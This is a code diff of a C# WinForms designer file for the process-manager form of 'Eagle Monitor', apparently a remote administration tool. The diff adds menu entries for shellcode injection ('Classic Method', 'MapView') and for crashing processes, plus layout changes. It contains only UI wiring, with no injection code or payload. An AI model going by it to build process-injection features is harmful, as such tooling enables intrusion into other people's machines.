@@ -35,6 +35,10 @@ namespace Eagle_Monitor.Forms
             this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.killToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.suspendToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.injectShellCodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.classicMethodToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.mapViewToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.crashProcessToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.resumeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.setWindowsTextToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.minimizeWindowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -49,6 +53,7 @@ namespace Eagle_Monitor.Forms
             this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.columnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.closeButton = new Eagle_Monitor.Controls.WindowsButton();
             this.maximizeButton = new Eagle_Monitor.Controls.WindowsButton();
             this.minimizeButton = new Eagle_Monitor.Controls.WindowsButton();
@@ -59,11 +64,13 @@ namespace Eagle_Monitor.Forms
             // 
             this.processContextMenuStrip.BackColor = System.Drawing.SystemColors.Control;
             this.processContextMenuStrip.Font = new System.Drawing.Font("Segoe UI", 8.25F);
-            this.processContextMenuStrip.ImageScalingSize = new System.Drawing.Size(28, 28);
+            this.processContextMenuStrip.ImageScalingSize = new System.Drawing.Size(24, 24);
             this.processContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.refreshToolStripMenuItem,
             this.killToolStripMenuItem,
             this.suspendToolStripMenuItem,
+            this.injectShellCodeToolStripMenuItem,
+            this.crashProcessToolStripMenuItem,
             this.resumeToolStripMenuItem,
             this.setWindowsTextToolStripMenuItem,
             this.minimizeWindowToolStripMenuItem,
@@ -71,7 +78,7 @@ namespace Eagle_Monitor.Forms
             this.hideWindowToolStripMenuItem,
             this.showWindowToolStripMenuItem});
             this.processContextMenuStrip.Name = "processContextMenuStrip";
-            this.processContextMenuStrip.Size = new System.Drawing.Size(193, 332);
+            this.processContextMenuStrip.Size = new System.Drawing.Size(177, 334);
             // 
             // refreshToolStripMenuItem
             // 
@@ -79,7 +86,7 @@ namespace Eagle_Monitor.Forms
             this.refreshToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
             this.refreshToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.icons8_replay_32;
             this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
-            this.refreshToolStripMenuItem.Size = new System.Drawing.Size(192, 34);
+            this.refreshToolStripMenuItem.Size = new System.Drawing.Size(176, 30);
             this.refreshToolStripMenuItem.Text = "Refresh";
             this.refreshToolStripMenuItem.Click += new System.EventHandler(this.refreshToolStripMenuItem_Click);
             // 
@@ -89,7 +96,7 @@ namespace Eagle_Monitor.Forms
             this.killToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
             this.killToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.icons8_skull_32;
             this.killToolStripMenuItem.Name = "killToolStripMenuItem";
-            this.killToolStripMenuItem.Size = new System.Drawing.Size(192, 34);
+            this.killToolStripMenuItem.Size = new System.Drawing.Size(176, 30);
             this.killToolStripMenuItem.Text = "Kill";
             this.killToolStripMenuItem.Click += new System.EventHandler(this.killToolStripMenuItem_Click);
             // 
@@ -99,9 +106,51 @@ namespace Eagle_Monitor.Forms
             this.suspendToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
             this.suspendToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.icons8_pause_button_32;
             this.suspendToolStripMenuItem.Name = "suspendToolStripMenuItem";
-            this.suspendToolStripMenuItem.Size = new System.Drawing.Size(192, 34);
+            this.suspendToolStripMenuItem.Size = new System.Drawing.Size(176, 30);
             this.suspendToolStripMenuItem.Text = "Suspend";
             this.suspendToolStripMenuItem.Click += new System.EventHandler(this.suspendToolStripMenuItem_Click);
+            // 
+            // injectShellCodeToolStripMenuItem
+            // 
+            this.injectShellCodeToolStripMenuItem.BackColor = System.Drawing.Color.White;
+            this.injectShellCodeToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.classicMethodToolStripMenuItem,
+            this.mapViewToolStripMenuItem});
+            this.injectShellCodeToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
+            this.injectShellCodeToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.setupapi_32;
+            this.injectShellCodeToolStripMenuItem.Name = "injectShellCodeToolStripMenuItem";
+            this.injectShellCodeToolStripMenuItem.Size = new System.Drawing.Size(176, 30);
+            this.injectShellCodeToolStripMenuItem.Text = "Inject ShellCode";
+            // 
+            // classicMethodToolStripMenuItem
+            // 
+            this.classicMethodToolStripMenuItem.BackColor = System.Drawing.Color.White;
+            this.classicMethodToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
+            this.classicMethodToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.icons8_memory_mslot_32;
+            this.classicMethodToolStripMenuItem.Name = "classicMethodToolStripMenuItem";
+            this.classicMethodToolStripMenuItem.Size = new System.Drawing.Size(160, 30);
+            this.classicMethodToolStripMenuItem.Text = "Classic Method";
+            this.classicMethodToolStripMenuItem.Click += new System.EventHandler(this.classicMethodToolStripMenuItem_Click);
+            // 
+            // mapViewToolStripMenuItem
+            // 
+            this.mapViewToolStripMenuItem.BackColor = System.Drawing.Color.White;
+            this.mapViewToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
+            this.mapViewToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.icons8_transfer_32;
+            this.mapViewToolStripMenuItem.Name = "mapViewToolStripMenuItem";
+            this.mapViewToolStripMenuItem.Size = new System.Drawing.Size(160, 30);
+            this.mapViewToolStripMenuItem.Text = "MapView";
+            this.mapViewToolStripMenuItem.Click += new System.EventHandler(this.mapViewToolStripMenuItem_Click);
+            // 
+            // crashProcessToolStripMenuItem
+            // 
+            this.crashProcessToolStripMenuItem.BackColor = System.Drawing.Color.White;
+            this.crashProcessToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
+            this.crashProcessToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.icons8_poison_32;
+            this.crashProcessToolStripMenuItem.Name = "crashProcessToolStripMenuItem";
+            this.crashProcessToolStripMenuItem.Size = new System.Drawing.Size(176, 30);
+            this.crashProcessToolStripMenuItem.Text = "Crash Process";
+            this.crashProcessToolStripMenuItem.Click += new System.EventHandler(this.crashProcessToolStripMenuItem_Click);
             // 
             // resumeToolStripMenuItem
             // 
@@ -109,7 +158,7 @@ namespace Eagle_Monitor.Forms
             this.resumeToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
             this.resumeToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.icons8_circled_play_32;
             this.resumeToolStripMenuItem.Name = "resumeToolStripMenuItem";
-            this.resumeToolStripMenuItem.Size = new System.Drawing.Size(192, 34);
+            this.resumeToolStripMenuItem.Size = new System.Drawing.Size(176, 30);
             this.resumeToolStripMenuItem.Text = "Resume";
             this.resumeToolStripMenuItem.Click += new System.EventHandler(this.resumeToolStripMenuItem_Click);
             // 
@@ -119,7 +168,7 @@ namespace Eagle_Monitor.Forms
             this.setWindowsTextToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
             this.setWindowsTextToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.icons8_type_32;
             this.setWindowsTextToolStripMenuItem.Name = "setWindowsTextToolStripMenuItem";
-            this.setWindowsTextToolStripMenuItem.Size = new System.Drawing.Size(192, 34);
+            this.setWindowsTextToolStripMenuItem.Size = new System.Drawing.Size(176, 30);
             this.setWindowsTextToolStripMenuItem.Text = "Set Windows Text";
             this.setWindowsTextToolStripMenuItem.Click += new System.EventHandler(this.setWindowsTextToolStripMenuItem_Click);
             // 
@@ -129,7 +178,7 @@ namespace Eagle_Monitor.Forms
             this.minimizeWindowToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
             this.minimizeWindowToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.icons8_minimize_window_32;
             this.minimizeWindowToolStripMenuItem.Name = "minimizeWindowToolStripMenuItem";
-            this.minimizeWindowToolStripMenuItem.Size = new System.Drawing.Size(192, 34);
+            this.minimizeWindowToolStripMenuItem.Size = new System.Drawing.Size(176, 30);
             this.minimizeWindowToolStripMenuItem.Text = "Minimize Window";
             this.minimizeWindowToolStripMenuItem.Click += new System.EventHandler(this.minimizeWindowToolStripMenuItem_Click);
             // 
@@ -139,7 +188,7 @@ namespace Eagle_Monitor.Forms
             this.maximizeWindowToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
             this.maximizeWindowToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.icons8_maximize_window_32;
             this.maximizeWindowToolStripMenuItem.Name = "maximizeWindowToolStripMenuItem";
-            this.maximizeWindowToolStripMenuItem.Size = new System.Drawing.Size(192, 34);
+            this.maximizeWindowToolStripMenuItem.Size = new System.Drawing.Size(176, 30);
             this.maximizeWindowToolStripMenuItem.Text = "Maximize Window";
             this.maximizeWindowToolStripMenuItem.Click += new System.EventHandler(this.maximizeWindowToolStripMenuItem_Click);
             // 
@@ -149,7 +198,7 @@ namespace Eagle_Monitor.Forms
             this.hideWindowToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
             this.hideWindowToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.icons8_invisible_32;
             this.hideWindowToolStripMenuItem.Name = "hideWindowToolStripMenuItem";
-            this.hideWindowToolStripMenuItem.Size = new System.Drawing.Size(192, 34);
+            this.hideWindowToolStripMenuItem.Size = new System.Drawing.Size(176, 30);
             this.hideWindowToolStripMenuItem.Text = "Hide Window";
             this.hideWindowToolStripMenuItem.Click += new System.EventHandler(this.hideWindowToolStripMenuItem_Click);
             // 
@@ -159,7 +208,7 @@ namespace Eagle_Monitor.Forms
             this.showWindowToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
             this.showWindowToolStripMenuItem.Image = global::Eagle_Monitor.Properties.Resources.icons8_eye_32;
             this.showWindowToolStripMenuItem.Name = "showWindowToolStripMenuItem";
-            this.showWindowToolStripMenuItem.Size = new System.Drawing.Size(192, 34);
+            this.showWindowToolStripMenuItem.Size = new System.Drawing.Size(176, 30);
             this.showWindowToolStripMenuItem.Text = "Show Window";
             this.showWindowToolStripMenuItem.Click += new System.EventHandler(this.showWindowToolStripMenuItem_Click);
             // 
@@ -207,12 +256,14 @@ namespace Eagle_Monitor.Forms
             // 
             // processesListView
             // 
+            this.processesListView.BackColor = System.Drawing.Color.White;
             this.processesListView.BorderStyle = System.Windows.Forms.BorderStyle.None;
             this.processesListView.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
             this.columnHeader1,
             this.columnHeader2,
             this.columnHeader3,
-            this.columnHeader4});
+            this.columnHeader4,
+            this.columnHeader5});
             this.processesListView.ContextMenuStrip = this.processContextMenuStrip;
             this.processesListView.Dock = System.Windows.Forms.DockStyle.Fill;
             this.processesListView.Font = new System.Drawing.Font("Segoe UI", 8.25F);
@@ -220,7 +271,7 @@ namespace Eagle_Monitor.Forms
             this.processesListView.HideSelection = false;
             this.processesListView.Location = new System.Drawing.Point(3, 30);
             this.processesListView.Name = "processesListView";
-            this.processesListView.Size = new System.Drawing.Size(1034, 417);
+            this.processesListView.Size = new System.Drawing.Size(1184, 417);
             this.processesListView.Sorting = System.Windows.Forms.SortOrder.Ascending;
             this.processesListView.TabIndex = 15;
             this.processesListView.UseCompatibleStateImageBehavior = false;
@@ -246,6 +297,11 @@ namespace Eagle_Monitor.Forms
             this.columnHeader4.Text = "Window Handle";
             this.columnHeader4.Width = 186;
             // 
+            // columnHeader5
+            // 
+            this.columnHeader5.Text = "32/64 bit";
+            this.columnHeader5.Width = 142;
+            // 
             // closeButton
             // 
             this.closeButton.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
@@ -256,7 +312,7 @@ namespace Eagle_Monitor.Forms
             this.closeButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.closeButton.Font = new System.Drawing.Font("Segoe UI", 12F);
             this.closeButton.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
-            this.closeButton.Location = new System.Drawing.Point(1004, 0);
+            this.closeButton.Location = new System.Drawing.Point(1154, 0);
             this.closeButton.Name = "closeButton";
             this.closeButton.Size = new System.Drawing.Size(33, 30);
             this.closeButton.TabIndex = 14;
@@ -274,7 +330,7 @@ namespace Eagle_Monitor.Forms
             this.maximizeButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.maximizeButton.Font = new System.Drawing.Font("Segoe UI", 12F);
             this.maximizeButton.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
-            this.maximizeButton.Location = new System.Drawing.Point(970, 0);
+            this.maximizeButton.Location = new System.Drawing.Point(1120, 0);
             this.maximizeButton.Name = "maximizeButton";
             this.maximizeButton.Size = new System.Drawing.Size(33, 30);
             this.maximizeButton.TabIndex = 13;
@@ -292,7 +348,7 @@ namespace Eagle_Monitor.Forms
             this.minimizeButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.minimizeButton.Font = new System.Drawing.Font("Segoe UI", 12F);
             this.minimizeButton.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
-            this.minimizeButton.Location = new System.Drawing.Point(936, 0);
+            this.minimizeButton.Location = new System.Drawing.Point(1086, 0);
             this.minimizeButton.Name = "minimizeButton";
             this.minimizeButton.Size = new System.Drawing.Size(33, 30);
             this.minimizeButton.TabIndex = 12;
@@ -304,7 +360,7 @@ namespace Eagle_Monitor.Forms
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(1040, 450);
+            this.ClientSize = new System.Drawing.Size(1190, 450);
             this.Controls.Add(this.labelSize);
             this.Controls.Add(this.label1);
             this.Controls.Add(this.loadingCircle1);
@@ -347,5 +403,10 @@ namespace Eagle_Monitor.Forms
         private System.Windows.Forms.ToolStripMenuItem hideWindowToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem showWindowToolStripMenuItem;
         private System.Windows.Forms.ColumnHeader columnHeader4;
+        private System.Windows.Forms.ToolStripMenuItem injectShellCodeToolStripMenuItem;
+        private System.Windows.Forms.ColumnHeader columnHeader5;
+        private System.Windows.Forms.ToolStripMenuItem crashProcessToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem classicMethodToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem mapViewToolStripMenuItem;
     }
 }
